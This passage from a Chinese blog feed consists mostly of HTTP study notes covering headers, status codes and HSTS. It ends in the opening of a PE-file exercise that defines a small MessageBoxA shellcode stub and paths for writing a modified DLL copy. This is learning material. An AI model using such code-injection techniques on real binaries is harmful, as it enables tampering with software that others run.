<p><strong>五、Entity 头域</strong></p>
<table>
<thead>
<tr>
<th>Entity字段名称</th>
<th>字段值描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Content-Length</strong></td>
<td>发送给 HTTP 服务器数据的长度。</td>
</tr>
<tr>
<td><strong>Content-Type</strong></td>
<td>①表示具体请求中的媒体类型信息。常见的媒体格式类型如下。<br/><strong>text&#x2F;html</strong>：HTML格式<br/><strong>text&#x2F;plain</strong>：纯文本格式<br/><strong>text&#x2F;xml</strong>：XML格式<br/><strong>imag&#x2F;gif</strong>：gif图片格式<br/><strong>image&#x2F;jpeg</strong>：jpg图片格式<br/><strong>image&#x2F;png</strong>：png图片格式<br/>②以application开头的媒体格式类型如下：<br/><strong>application&#x2F;xhtml+xml</strong>：XHTML格式<br/><strong>application&#x2F;xml</strong>：XML数据格式<br/><strong>application&#x2F;atom+xml</strong>：Atom XML聚合格式<br/><strong>application&#x2F;json</strong>：JSON数据格式<br/><strong>application&#x2F;pdf</strong>：pdf格式<br/><strong>application&#x2F;msword</strong>：Word文档格式<br/><strong>application&#x2F;octet-stream</strong>：二进制流数据<br/><strong>application&#x2F;x-www-form-urlencoded</strong>： <code>&lt;form encType=&quot;&quot;&gt;</code>中默认的<code>encType</code>，<code>form</code>表单数据被编码为<code>key/value</code><br/>格式发送到服务器（表单默认的提交数据的格式）。<br/>③另外一种常见的媒体格式是上传文件之时使用的。<br/><strong>multipart&#x2F;form-data</strong>：需要在表单中进行文件上传时，就需要使用该格式。</td>
</tr>
</tbody></table>
<p><strong>六、Transport 头域</strong></p>
<table>
<thead>
<tr>
<th>Transport字段名称</th>
<th>字段值描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Connection</strong></td>
<td><strong>Connection: keep-alive</strong>：当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建 立的连接。<br/><strong>Connection: close</strong>：代表一个 request 完成后，客户端和服务器之间用于传输 HTTP 数据的TCP 连接会关闭，当客户端再次发送 request 时，需要重新建立 TCP 连接。</td>
</tr>
<tr>
<td><strong>Host</strong></td>
<td>发送请求时，该报头域是必需的</td>
</tr>
</tbody></table>
<p>参考文章：</p>
<ul>
<li><a href="https://www.cnblogs.com/Mr-mubai/p/11603520.html">HTTP报文格式</a></li>
<li><a href="https://www.cnblogs.com/kageome/p/10859996.html">http报文详解</a></li>
<li><a href="https://blog.csdn.net/u012375924/article/details/82806617">浅谈http中的Cache-Control</a></li>
<li><a href="https://wenku.baidu.com/view/80397dda71fe910ef12df8af.html">http协议请求响应报文格式及状态码详解</a></li>
</ul>
<h4 id="2-4-响应报文（response）"><a href="#2-4-响应报文（response）" class="headerlink" title="2.4 响应报文（response）"></a>2.4 响应报文（response）</h4><h5 id="2-4-1-报文格式"><a href="#2-4-1-报文格式" class="headerlink" title="2.4.1 报文格式"></a>2.4.1 报文格式</h5><p>Response 报文的结构也分为 4 部分：</p>
<ul>
<li>响应状态（response code）</li>
<li>响应头（response header）</li>
<li>空行</li>
<li>响应主体（response body）</li>
</ul>
<p>header 和 body 之间也有一个空行。</p>
<p><img data-src="https://i.loli.net/2020/11/06/a8rIAkjD7qdzFT4.png" alt="屏幕快照 2020-11-06 下午2.40.03.png"></p>
<h5 id="2-4-2-状态行"><a href="#2-4-2-状态行" class="headerlink" title="2.4.2 状态行"></a>2.4.2 状态行</h5><p>状态行最重要的一部分就是响应报文的<mark class="label success">状态码</mark>。</p>
<p>当客户端发起一次 HTTP请求后，服务器会返回一个包含 HTTP 状态码的信息头（server header ）用以响应客户端的请求。response 消息中的第一行叫作<strong>状态行</strong>，由 HTTP 协议<strong>版本号</strong>、<strong>状态码</strong>、<strong>状态消息</strong>三部分组成。</p>
<p>状态码用来告诉 HTTP 客户端 HTTP 服务器是否产生了预期的 response。</p>
<div class="note warning"><p>状态码<mark class="label danger">总共只有三位</mark>，<mark class="label danger">第一位</mark>表示状态类别，共分为<mark class="label success">五种</mark>。</p>
<ul>
<li><mark class="label primary">1xx</mark>：是进度通知类状态，意思就是说“请求我已经收到了，或你的请求我正在处理”。</li>
<li><mark class="label primary">2xx</mark>：表示“你的请求我已经成功处理了”。</li>
<li><mark class="label primary">3xx</mark>：即重定向，也就是服务器告诉客户端“你要的资源搬家了，你到某某地方再去找它吧”。</li>
<li><mark class="label primary">4xx</mark>：客户端发来的响应报文里有些<strong>错误</strong>，比如语法错误或请求的资源不存在等。</li>
<li><mark class="label primary">5xx</mark>：服务器端有些问题，已经无法处理完成你的请求了。</li>
</ul>
</div>

<p>常用的一些状态码如下：</p>
<ul>
<li><strong>200 OK</strong>：客户端，你的请求处理成功，你要的东西就在响应报文里了。</li>
<li><strong>301 Moved Permanently</strong>：客户端，你要请求的资源已经永久地搬家了，我把它的新地址放到了<code>Location</code>头部域中了。</li>
<li><strong>302 Moved Temporarily</strong>：客户端，你要请求的源临时有事去别的地方了，我把它的位置放到<code>Location</code>头部域中了，你可以先去那里找它.不过它应该会回到它原来的家的。</li>
<li><strong>304 Not Modified</strong>：客户端，你要请求的资源自从上次你请求之后，就再也没有改动过。我想你应该早就有这个资源了。所以在响应报文的数据部分我就没有再放这个资源。</li>
<li><strong>400 Bad Request</strong>客户端，你发来的请求报文里有语法情误，服务器端实在看不懂。 </li>
<li><strong>401 Unauthorized</strong>：客户端，你发来的请求不是合法来源的请求，你是没有被授权的客户端吧。 </li>
<li><strong>403 Forbidden</strong>：服务器端顺利收到了客户端的请求，但因为某些理由，服务器端拒绝为你提供服务。</li>
<li><strong>404 Not Found</strong>：客户端，你请求的资源不存在，八成是资源地址写错了。</li>
<li><strong>500 Internal Server Error</strong>：很遗憾，服务器不能给你提供服务了，服务器内部出现了不可预知的问题。</li>
<li><strong>502 Bad Gateway</strong>：客户端你好，我是请求报文的代理服务器，持有资源的那个服务器在给我发送资源时出问题了。</li>
<li><strong>503 Server Unavailable</strong>：服务器现在可能是太忙了，暂时不能给你这个客户端提供服务，或许稍后会恢复的。</li>
</ul>
<p>除了以上几个常用的状态码，还有许多其他含义的状态码。完整状态码含义表如下。</p>
<p>（1）<mark class="label warning">请求收到，继续处理</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">100</td>
<td>Continue</td>
<td>客户端必须继续发出请求</td>
</tr>
<tr>
<td align="center">101</td>
<td>Switching Protocols</td>
<td>客户端要求服务器根据请求转换 HTTP 协议版本</td>
</tr>
</tbody></table>
<p>（2）<mark class="label warning">成功响应，操作成功收到，分析、接受</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">200</td>
<td>OK</td>
<td>请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td align="center">201</td>
<td>Created</td>
<td>已创建。成功请求并创建了新的资源。提示知道新文件的URL</td>
</tr>
<tr>
<td align="center">202</td>
<td>Accepted</td>
<td>已接受和处理，但处理未完成</td>
</tr>
<tr>
<td align="center">203</td>
<td>Non-Authoritative Information</td>
<td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本<br/>返回信息不确定或不完整</td>
</tr>
<tr>
<td align="center">204</td>
<td>No Content</td>
<td>无内容。服务器成功处理，但未返回内容。但返回信息为空<br/>在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td align="center">205</td>
<td>Reset Content</td>
<td>重置内容。服务器处理成功，用户终端（例如：浏览器）必须复位当前已经测览过的文件</td>
</tr>
<tr>
<td align="center">206</td>
<td>Partial Content</td>
<td>部分内容。服务器成功处理了部分 GET 请求</td>
</tr>
</tbody></table>
<p>（3）<mark class="label warning">重定向，完成此请求必须进一步处理</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">300</td>
<td>Multiple Choices</td>
<td>多种选择。请求的资源可在多处得到</td>
</tr>
<tr>
<td align="center">301</td>
<td>Moved Permanently</td>
<td>永久移动。请求的资源已被永久的移动到新 URI ，返回信息会包括新的 URI ，浏览器会自动定向到新 URI。<br/>今后任何新的请求都应使用新的 URI 代替</td>
</tr>
<tr>
<td align="center">302</td>
<td>Found</td>
<td>临时移动。与 301 类似。但资源只是临时被移动。客户端应继续使用原有 URI<br/>只有在<code>Cache-Control</code>或<code>Expires</code>中进行了指定的情况下，这个响应才是可缓存的</td>
</tr>
<tr>
<td align="center">303</td>
<td>See Other</td>
<td>查看其它地址。对应当前请求的响应可以在另一个 URI 上被找到，使用 GET 和 POST 请求查看<br/>这个方法的存在主要是为了允许由脚本激活的 POST 请求输出重定向到一个新的资源</td>
</tr>
<tr>
<td align="center">304</td>
<td>Not Modified</td>
<td>未修改。GET 所请求的资源未修改，服务器返回此状态码时，不会返回任何资源<br/>304 响应禁止包含消息体，因此始终以消息头后的第一个空行结尾</td>
</tr>
<tr>
<td align="center">305</td>
<td>Use Proxy</td>
<td>使用代理。所请求的资源必须通过服务器指定的代理访问</td>
</tr>
<tr>
<td align="center">306</td>
<td>Unused</td>
<td>已经被废弃的HTTP状态码，前一版本 HTTP 中使用用的代码，现行版本中 HTTP 不再使用</td>
</tr>
<tr>
<td align="center">307</td>
<td>Temporary Redirect</td>
<td>临时重定向。与302类似。使用GET请求重定向。</td>
</tr>
</tbody></table>
<p>（4）<mark class="label warning">请求错误，请求包含一个错误语法或不能完成</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">400</td>
<td>Bad Request</td>
<td>错误请求，如语法错误</td>
</tr>
<tr>
<td align="center">401</td>
<td>Unauthorized</td>
<td>未授权，请求要求用户的身份认证</td>
</tr>
<tr>
<td align="center">401.1</td>
<td></td>
<td>未授权：登录失败</td>
</tr>
<tr>
<td align="center">401.2</td>
<td></td>
<td>未授权：服务器配置问题导致登录失败</td>
</tr>
<tr>
<td align="center">401.3</td>
<td></td>
<td>未授权：禁止访问资源，由于 ACL 对资源的限制而未获得授权。</td>
</tr>
<tr>
<td align="center">401.4</td>
<td></td>
<td>授权被筛选器拒绝</td>
</tr>
<tr>
<td align="center">401.5</td>
<td></td>
<td>未授权：ISAPI 或 CGl 授权失败</td>
</tr>
<tr>
<td align="center">401.7</td>
<td></td>
<td>访问被 Web 服务器上的 URL 授权策略拒绝。这个错误代码为 IIS 6.0 所专用。</td>
</tr>
<tr>
<td align="center">402</td>
<td>Payment Required</td>
<td>保留，将来使用</td>
</tr>
<tr>
<td align="center">403</td>
<td>Forbidden</td>
<td>服务器理解请求客户端的请求，但是拒绝执行此请求</td>
</tr>
<tr>
<td align="center">403.1</td>
<td></td>
<td>禁止可执行访问</td>
</tr>
<tr>
<td align="center">403.2</td>
<td></td>
<td>禁止读访问</td>
</tr>
<tr>
<td align="center">403.3</td>
<td></td>
<td>禁止写访问</td>
</tr>
<tr>
<td align="center">403.4</td>
<td></td>
<td>禁止访问：要求SSL</td>
</tr>
<tr>
<td align="center">403.5</td>
<td></td>
<td>禁止访问：要求SSL128</td>
</tr>
<tr>
<td align="center">403.6</td>
<td></td>
<td>禁止访问：IP地址被拒绝</td>
</tr>
<tr>
<td align="center">403.7</td>
<td></td>
<td>禁止访问：要求客户证书</td>
</tr>
<tr>
<td align="center">403.8</td>
<td></td>
<td>禁止访问：禁止站点访问</td>
</tr>
<tr>
<td align="center">403.9</td>
<td></td>
<td>禁止访问：连接的用户过多</td>
</tr>
<tr>
<td align="center">403.10</td>
<td></td>
<td>禁止访问：配置无效</td>
</tr>
<tr>
<td align="center">403.11</td>
<td></td>
<td>禁止访问：密码更改</td>
</tr>
<tr>
<td align="center">403.12</td>
<td></td>
<td>禁止访问：映射器拒绝访问</td>
</tr>
<tr>
<td align="center">403.13</td>
<td></td>
<td>禁止访问：客户证书已被吊销</td>
</tr>
<tr>
<td align="center">403.14</td>
<td></td>
<td>禁止访问：Web 服务器被配置不列出此目录的内容</td>
</tr>
<tr>
<td align="center">403.15</td>
<td></td>
<td>禁止访问：客户访问许可过多</td>
</tr>
<tr>
<td align="center">403.16</td>
<td></td>
<td>禁止访问：客户证书不可信或者无效</td>
</tr>
<tr>
<td align="center">403.17</td>
<td></td>
<td>禁止访问：客户证书已经到期或者尚未生效</td>
</tr>
<tr>
<td align="center">403.18</td>
<td></td>
<td>客户端证书已过期或尚未生效。</td>
</tr>
<tr>
<td align="center">403.19</td>
<td></td>
<td>不能为这个应用程序池中的客户端执行 CGI。这个错误代码为 IIS 6.0 所专用。</td>
</tr>
<tr>
<td align="center">403.20</td>
<td></td>
<td>Passport 登录失败。这个错误代码为 IIS 6.0 所专用。</td>
</tr>
<tr>
<td align="center">404</td>
<td>Not Found</td>
<td>服务器无法根据客户端的请求找到资源（网页）。没有发现文件、 查询或URI</td>
</tr>
<tr>
<td align="center">405</td>
<td>Method Not Allowed</td>
<td>客户端请求中的方法被禁止。用户在<code>Request-Line</code>字段定义的方法不允许</td>
</tr>
<tr>
<td align="center">406</td>
<td>Not Acceptable</td>
<td>无法接受用户发送的请求，请求资源不可被访问</td>
</tr>
<tr>
<td align="center">407</td>
<td>Proxy Authentication Required</td>
<td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td align="center">408</td>
<td>Request Time-out</td>
<td>客户端没有在用户指定的时间内完成请求，超时</td>
</tr>
<tr>
<td align="center">409</td>
<td>Conflict</td>
<td>由于和被请求的资源的当前状态之间存在冲突，请求无法完成。</td>
</tr>
<tr>
<td align="center">410</td>
<td>Gone</td>
<td>客户端请求的资源已经不存在。<br/>410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
</tr>
<tr>
<td align="center">411</td>
<td>Length Required</td>
<td>服务器无法处理客户端发送的不带Content-Length的请求信息</td>
</tr>
<tr>
<td align="center">412</td>
<td>Precondition Failed</td>
<td>一个或多个请求头字段在当前请求中错误</td>
</tr>
<tr>
<td align="center">413</td>
<td>Request Entity Too Large</td>
<td>请求的资源大于服务器允许的大小，服务器无法处理，因此拒绝请求。</td>
</tr>
<tr>
<td align="center">414</td>
<td>Request-URI Too Large</td>
<td>请求的 URI 过长（ URI 通常为网址），服务器无法处理</td>
</tr>
<tr>
<td align="center">415</td>
<td>Unsupported Media Type</td>
<td>服务器无法处理请求附带的媒体格式，请求资源不支持请求项目格式</td>
</tr>
<tr>
<td align="center">416</td>
<td>Requested range not satisfiable</td>
<td>客户端请求的范围无效</td>
</tr>
<tr>
<td align="center">417</td>
<td>Expectation Failed</td>
<td>服务器无法满足 Expect 的请求头信息</td>
</tr>
</tbody></table>
<p>（5）<mark class="label warning">服务端响应</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">500</td>
<td>Internal Server Error</td>
<td>服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td align="center">500.11</td>
<td></td>
<td>服务器关闭</td>
</tr>
<tr>
<td align="center">500.12</td>
<td></td>
<td>应用程序重新启动</td>
</tr>
<tr>
<td align="center">500.13</td>
<td></td>
<td>服务器太忙</td>
</tr>
<tr>
<td align="center">500.14</td>
<td></td>
<td>应用程序无效</td>
</tr>
<tr>
<td align="center">500.15</td>
<td></td>
<td>不允许请求</td>
</tr>
<tr>
<td align="center">501</td>
<td>Not Implemented</td>
<td>服务器不支持请求的功能，无法完成请求</td>
</tr>
<tr>
<td align="center">502</td>
<td>Bad Gateway</td>
<td>网关错误。<br/>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
</tr>
<tr>
<td align="center">503</td>
<td>Service Unavailable</td>
<td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。<br/>延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
<tr>
<td align="center">504</td>
<td>Gateway Time-out</td>
<td>充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td align="center">505</td>
<td>HTTP Version not supported</td>
<td>服务器不支持请求的HTTP协议的版本，无法完成处理</td>
</tr>
</tbody></table>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP 响应代码</a></li>
<li><a href="https://www.runoob.com/http/http-status-codes.html">HTTP状态码</a></li>
<li><a href="https://blog.csdn.net/dufufd/article/details/53112184">常见的HTTP状态码(HTTP Status Code)说明</a></li>
<li><a href="https://tool.oschina.net/commons?type=5">HTTP状态码详解</a></li>
</ul>
<h5 id="2-4-3-响应头"><a href="#2-4-3-响应头" class="headerlink" title="2.4.3 响应头"></a>2.4.3 响应头</h5><p><strong>一、Cache 头域</strong></p>
<table>
<thead>
<tr>
<th>Cache字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Cache-Concrol</strong></td>
<td>缓存内容，上一节已说明。</td>
</tr>
<tr>
<td><strong>Date</strong></td>
<td>生成消息的具体时间和日期。</td>
</tr>
<tr>
<td><strong>Expires</strong></td>
<td>浏览器会制定过期时间内使用本地缓存。格林尼治时间 GMT。</td>
</tr>
<tr>
<td><strong>Pragma</strong></td>
<td>浏览内容不会被缓存</td>
</tr>
</tbody></table>
<p><strong>二、Cookie&#x2F;Login 头域</strong></p>
<table>
<thead>
<tr>
<th>Cookie字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>P3P</strong></td>
<td>用于跨域设置 Cookie，这样可以解决<code>iframe</code>跨域访问 Cookie 的问题。</td>
</tr>
<tr>
<td><strong>Set-Cookie</strong></td>
<td>用于把 Cookie 发送到客户端浏览器，每一个写入 Cookie 都会生成个<code>Set-Cookie</code></td>
</tr>
</tbody></table>
<p><strong>三、Entity 头域</strong></p>
<table>
<thead>
<tr>
<th>Entity字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ETag</strong></td>
<td>和<code>If-None-Match</code>配合使用。</td>
</tr>
<tr>
<td><strong>Last-Modified</strong></td>
<td>用于指示资源的最后修改日期和时间。</td>
</tr>
<tr>
<td><strong>Content-Type</strong></td>
<td>Web服务器告诉浏览器自己响应的对象的类型和字符集。</td>
</tr>
<tr>
<td><strong>Content-Length</strong></td>
<td>指明实体正文的长度，以字节方式存储的十进制数字来表示。</td>
</tr>
<tr>
<td><strong>Content-Encoding</strong></td>
<td>Web服务器表明自己使用了什么压缩方法( gzip, deflate )压缩响应中的对象。</td>
</tr>
<tr>
<td><strong>Content-Language</strong></td>
<td>Web服务器告诉浏览器自己响应的对象的语言。</td>
</tr>
</tbody></table>
<p><strong>四、Miscellaneous 头域</strong></p>
<table>
<thead>
<tr>
<th>Miscellaneous字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td>Server</td>
<td>指明 HTTP 服务器的软件信息。</td>
</tr>
<tr>
<td>X-AspNet-Version</td>
<td>如果网站是用<code>ASP.NET</code>开发的，这个<code>header</code>用来表示<code>ASP.NET</code>的版本。</td>
</tr>
<tr>
<td>X-Powered-By</td>
<td>表示网站是用什么技术开发的。</td>
</tr>
</tbody></table>
<p><strong>五、Transport 头域</strong></p>
<table>
<thead>
<tr>
<th>Transport字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Connection: keep-alive</strong></td>
<td>当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭<br/>如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接</td>
</tr>
<tr>
<td><strong>Connection: close</strong></td>
<td>代表一个 request 完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接会关闭<br/>当客户端再次发送 Request 时，需要重新建立 TCP 连接。</td>
</tr>
</tbody></table>
<p>一个传输层的实际环流，它是建立在两个相互通信的应用程序之间。</p>
<p>在 HTTP1.1,中，<code>request</code>和<code>response</code>头中都有可能出现个<code>Connection</code>的头，此<code>header</code>的含义是当 Client 和 Server 通信时对于长连接如何进行处理。</p>
<div class="note primary"><ul>
<li>HTTP&#x2F;1.0，Connection: close</li>
<li>HTTP&#x2F;1.1，Connection: keep-alive</li>
<li>HTTP TCP，无状态，面向连接。</li>
<li>HTTP UDP，无状态，无连接</li>
</ul>
<p>HTTP 的无状态和<code>Connection: keep-alive</code>是两个不同的概念。无状态是指协议对于事务处理没有记忆，服务器不知道客户端是什么状态。也就是说，打开一个服务器上的网页和之前打开这个服务器上的网页之间没有任何联系，所以出现了 <strong>Cookie、Session等来解决无状态</strong>的问题。</p>
<p>keep-alive 不会永久保持，它有一个保持时间。</p>
</div>

<p><strong>六、Location 头域</strong></p>
<p>用于重定向一个新的位置，包含新的 URL 地址。</p>
<p><strong>七、Security 头域</strong></p>
<p>Strict-Transport-Security: max-age-31536000</p>
<p>网站通过 HTTP Strict Transport Security (HSTS ) 通知浏览器，这个网站禁止使用 HTTP 方式加载，浏览器应该自动把所有尝试使用 HTTP 的请求自动替换为 HTTPS 请求。</p>
<p>当你的网站第一次发送 HTTPS 请求，服务器响应<code>Strict-Transport-Security</code>头，浏览器记录下这些信息。然后后面尝试访问这个网站的请求都会自动把 HTTP 替换为 HTTPS 。当 HTTPS 头设置的过期时间到了，后面通过HTTP 的访问恢复到正常模式，不会再自动跳转到 HTTPS。每次浏览器接收到<code>Strict-Transport-Security</code>头，它都会更新这个网站的过期时间，所以网站可以刷新这些信息，防止过期发生。</p>
<p>会话保持、长连接、短链接：</p>
<ul>
<li><a href="https://cloud.tencent.com/document/product/214/6154">文档中心 &gt; 负载均衡 &gt; 负载均衡监听器 &gt; 会话保持</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/32943807">负载均衡之TCP会话保持（一）</a></li>
<li><a href="https://blog.csdn.net/dshf_1/article/details/89336750">负载均衡的会话保持和长短连接简介</a></li>
<li><a href="https://blog.csdn.net/qq_31812703/article/details/79082542">会话的长连接与短连接详解</a></li>
</ul>
<p>关于同源策略：</p>
<ul>
<li><a href="https://www.cnblogs.com/laixiangran/p/9064769.html">浏览器同源策略及跨域的解决方法</a></li>
<li><a href="https://www.cnblogs.com/xhz-dalalala/p/5259965.html">同源策略和跨域-总结</a></li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>软件测试</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL入门</title>
    <url>/post/MySQL-Primer/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d453030e0db996b626430279bfebc4f8ef7e6f10b7e2dd9ec8f27ebc121ba083"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PE-SourceCode-C</title>
    <url>/post/PE-SourceCode-C/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<p>常用的数据类型的定义包含在头文件<code>windows.h</code>实际上是<code>winnt.h</code>。</p>
<h2 id="0-HeaderFile-h"><a href="#0-HeaderFile-h" class="headerlink" title="0 HeaderFile.h"></a>0 HeaderFile.h</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span>                                                                                        </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span>                                                                                        </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MessageBoxA_Addr   0x7631FD1E</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ShellCodeLength  0x12</span></span><br><span class="line"></span><br><span class="line">BYTE ShellCode[] = &#123;</span><br><span class="line">	<span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0xE9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//typedef  char *  LPSTR</span></span><br><span class="line">LPSTR FILEPATH = <span class="string">&quot;C:/symsrv.dll&quot;</span>; <span class="comment">//Using &quot;/&quot; OR &quot;\\&quot;</span></span><br><span class="line">LPSTR FilePath_Out = <span class="string">&quot;C:/symsrv_addSec.dll&quot;</span>;</span><br></pre></td></tr></table></figure>





<h2 id="1-ReadPEFile"><a href="#1-ReadPEFile" class="headerlink" title="1 ReadPEFile"></a>1 ReadPEFile</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">将文件读入缓冲区pFileBuffer</span></span><br><span class="line"><span class="comment">参数：文件路径</span></span><br><span class="line"><span class="comment">返回值：指向读入的文件缓冲区</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">LPVOID <span class="title">ReadPEFile</span><span class="params">(LPSTR lpszFile)</span>	</span></span><br><span class="line"><span class="function"></span>&#123;		</span><br><span class="line">	FILE *pFile = <span class="literal">NULL</span>;	</span><br><span class="line">	DWORD fileSize = <span class="number">0</span>;         <span class="comment">//typedef unsigned long DWORD						</span></span><br><span class="line">	LPVOID pFileBuffer = <span class="literal">NULL</span>;  <span class="comment">//typedef void*  LPVOID			</span></span><br><span class="line">		</span><br><span class="line">	<span class="comment">//打开文件	</span></span><br><span class="line">	pFile = <span class="built_in">fopen</span>(lpszFile, <span class="string">&quot;rb&quot;</span>); <span class="comment">//返回一个指向FILE类型的指针/NULL	</span></span><br><span class="line">	<span class="keyword">if</span>(!pFile)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 无法打开 EXE 文件! &quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//读取文件大小		</span></span><br><span class="line">	<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_END);<span class="comment">//int fseek（FILE *fp，long offset，int fromwhere）；</span></span><br><span class="line">	fileSize = <span class="built_in">ftell</span>(pFile);<span class="comment">//将fp的文件位置指针从fromwhere开始移动offset个字节指示下一个要读取的数据的位置</span></span><br><span class="line">	<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_SET);<span class="comment">//SEEK_SET或0，代表文件开始处；SEEK_CUR或1，代表文件当前位置；SEEK_END或2，代表文件结尾处。</span></span><br><span class="line">	<span class="comment">//分配缓冲区</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ReadPEFile文件大小：0x%x\n&quot;</span>,fileSize);</span><br><span class="line">	pFileBuffer = <span class="built_in">malloc</span>(fileSize);<span class="comment">//memset(pFileBuffer,0,fileSize)，将filesize大小的空间置为0</span></span><br><span class="line">	<span class="comment">// 需使用头文件&lt;memory.h&gt;或&lt;string.h&gt;</span></span><br><span class="line">	<span class="keyword">if</span>(!pFileBuffer)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 分配空间失败! &quot;</span>);</span><br><span class="line">		<span class="built_in">fclose</span>(pFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//将文件数据读取到缓冲区	</span></span><br><span class="line">	<span class="keyword">size_t</span> n = <span class="built_in">fread</span>(pFileBuffer, fileSize, <span class="number">1</span>, pFile);<span class="comment">//将文件pFile读到内存			 	 pFileBuffer，共1个块，每个块的大小filesize</span></span><br><span class="line">	<span class="keyword">if</span>(!n)    <span class="comment">//返回实际读到的块数</span></span><br><span class="line">	&#123;         <span class="comment">//&lt;stddef.h&gt;-----#typedef unsigned int size_t</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; 读取数据失败! &quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="built_in">fclose</span>(pFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//关闭文件	